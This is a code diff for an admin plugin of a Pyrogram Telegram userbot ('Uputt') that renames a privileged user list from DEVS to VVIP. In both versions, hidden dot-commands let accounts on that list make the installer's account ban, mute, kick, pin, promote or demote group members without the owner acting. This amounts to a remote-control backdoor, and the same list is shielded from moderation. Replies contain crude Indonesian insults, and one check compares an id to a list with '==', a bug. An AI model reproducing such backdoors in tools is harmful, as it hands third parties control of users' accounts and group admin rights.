@@ -14,7 +14,7 @@ from pyrogram.errors import ChatAdminRequired
 from pyrogram.types import ChatPermissions, ChatPrivileges, Message
 
 from config import CMD_HANDLER
-from Uputt.helpers.adminHelpers import DEVS
+from Uputt.helpers.adminHelpers import VVIP
 from Uputt.helpers.basic import edit_or_reply
 from .help import *
 from Uputt.utils.misc import extract_user, extract_user_and_reason, list_admins
@@ -49,7 +49,7 @@ async def set_chat_photo(client: Client, message: Message):
 
 
 @Client.on_message(
-    filters.group & filters.command("cban", ["."]) & filters.user(DEVS) & ~filters.me
+    filters.group & filters.command("cban", ["."]) & filters.user(VVIP) & ~filters.me
 )
 @Client.on_message(filters.group & filters.command("ban", cmd) & filters.me)
 async def member_ban(client: Client, message: Message):
@@ -62,7 +62,7 @@ async def member_ban(client: Client, message: Message):
         return await Man.edit("Tidak Bisa menemukan Pengguna.")
     if user_id == client.me.id:
         return await Man.edit("Contoh2 Anak Tolol, Ngentot lu!")
-    if user_id in DEVS:
+    if user_id in VVIP:
         return await Man.edit("Maaf, Itu developer saya!")
     if user_id in (await list_admins(client, message.chat.id)):
         return await Man.edit("I can't ban an admin, You know the rules, so do i.")
@@ -86,7 +86,7 @@ async def member_ban(client: Client, message: Message):
     await Man.edit(msg)
 
 
-@Client.on_message(filters.command("cunban", ["."]) & filters.user(DEVS) & ~filters.me)
+@Client.on_message(filters.command("cunban", ["."]) & filters.user(VVIP) & ~filters.me)
 @Client.on_message(filters.group & filters.command("unban", cmd) & filters.me)
 async def member_unban(client: Client, message: Message):
     reply = message.reply_to_message
@@ -111,7 +111,7 @@ async def member_unban(client: Client, message: Message):
 
 
 @Client.on_message(
-    filters.command(["cpin", "cunpin"], ["."]) & filters.user(DEVS) & ~filters.me
+    filters.command(["cpin", "cunpin"], ["."]) & filters.user(VVIP) & ~filters.me
 )
 @Client.on_message(filters.command(["pin", "unpin"], cmd) & filters.me)
 async def pin_message(client: Client, message):
@@ -135,7 +135,7 @@ async def pin_message(client: Client, message):
     )
 
 
-@Client.on_message(filters.command(["cmute"], ["."]) & filters.user(DEVS) & ~filters.me)
+@Client.on_message(filters.command(["cmute"], ["."]) & filters.user(VVIP) & ~filters.me)
 @Client.on_message(filters.command("mute", cmd) & filters.me)
 async def mute(client: Client, message: Message):
     user_id, reason = await extract_user_and_reason(message)
@@ -147,7 +147,7 @@ async def mute(client: Client, message: Message):
         return await Man.edit("Pengguna Tidak di temukan.")
     if user_id == client.me.id:
         return await Man.edit("Mana Bisa Anjing!.")
-    if user_id in DEVS:
+    if user_id in VVIP:
         return await Man.edit("Tidak Bisa Ngemute Developer Tolol!")
     if user_id in (await list_admins(client, message.chat.id)):
         return await Man.edit("I can't mute an admin, You know the rules, so do i.")
@@ -162,7 +162,7 @@ async def mute(client: Client, message: Message):
     await Man.edit(msg)
 
 
-@Client.on_message(filters.command(["cunmute"], ["."]) & filters.user(DEVS) & ~filters.me)
+@Client.on_message(filters.command(["cunmute"], ["."]) & filters.user(VVIP) & ~filters.me)
 @Client.on_message(filters.group & filters.command("unmute", cmd) & filters.me)
 async def unmute(client: Client, message: Message):
     user_id = await extract_user(message)
@@ -176,7 +176,7 @@ async def unmute(client: Client, message: Message):
     umention = (await client.get_users(user_id)).mention
     await Man.edit(f"Unmuted! {umention}")
 
-@Client.on_message(filters.command(["ckick", "cdkick"], ["."]) & filters.user(DEVS) & ~filters.me)
+@Client.on_message(filters.command(["ckick", "cdkick"], ["."]) & filters.user(VVIP) & ~filters.me)
 @Client.on_message(filters.command(["kick", "dkick"], cmd) & filters.me)
 async def kick_user(client: Client, message: Message):
     user_id, reason = await extract_user_and_reason(message)
@@ -188,7 +188,7 @@ async def kick_user(client: Client, message: Message):
         return await Uputt.edit("I can't find that user.")
     if user_id == client.me.id:
         return await Uputt.edit("I can't kick myself.")
-    if user_id == DEVS:
+    if user_id == VVIP:
         return await Uputt.edit("I can't kick my developer")
     if user_id in (await list_admins(client, message.chat.id)):
         return await Uputt.edit("I can't kick an admin, You know the rules, so do i.")
@@ -212,7 +212,7 @@ async def kick_user(client: Client, message: Message):
 @Client.on_message(
     filters.group
     & filters.command(["cpromote", "cfullpromote"], ["."])
-    & filters.user(DEVS)
+    & filters.user(VVIP)
     & ~filters.me
 )
 @Client.on_message(
@@ -262,7 +262,7 @@ async def promotte(client: Client, message: Message):
 @Client.on_message(
     filters.group
     & filters.command(["cdemote"], ["."])
-    & filters.user(DEVS)
+    & filters.user(VVIP)
     & ~filters.me
 )
 @Client.on_message(filters.group & filters.command("demote", cmd) & filters.me)
